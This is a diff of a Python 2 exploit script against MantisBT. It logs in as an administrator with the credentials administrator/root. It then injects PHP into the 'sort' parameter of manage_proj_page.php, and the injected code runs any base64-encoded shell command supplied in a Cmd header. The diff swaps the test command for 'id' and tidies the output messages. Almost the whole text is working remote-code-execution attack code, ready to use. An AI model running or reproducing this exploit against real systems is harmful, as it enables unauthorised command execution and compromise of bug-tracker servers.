@@ -2,32 +2,26 @@ import requests
 import base64
 import json
 
-# ']);}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;%23
-
 command = "']);}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;%23"
 
 headers = {
     'User-Agent':'honk honk lol',
-    'Cmd':'{}'.format(base64.b64encode('/tmp/loveme'))
+    'Cmd':'{}'.format(base64.b64encode('id'))
 }
 
 payload2 = {
     'sort':'{}'.format(command)
 }
 
-#loggin in
-print 'logging in...'
 with requests.session() as s:
     payload = {
         'username':'administrator',
         'password':'root'
     }
-    print 'sending first request'
+    print '[+] Logging in...'
     r = s.post('http://192.168.220.139/mantisbt/login.php', data=payload)
-    print 'request: {} {}'.format(r.status_code, r.reason)
-    print 'sending second request...'
-    string = "sort=']);}error_reporting(0);print(_code_);passthru(base64_decode($_SERVER[HTTP_CMD]));die;%23"
+    print '[+] Request: {} {}'.format(r.status_code, r.reason)
+    print '[+] Sending request...'
     second = s.get("http://192.168.220.139/mantisbt/manage_proj_page.php?sort={}".format(command), headers=headers)
-    print 'Status of: ' + second.url
-    print second.status_code, second.reason
+    print '[+] Request: {} {}'.format(second.status_code, second.reason)
     print second.content
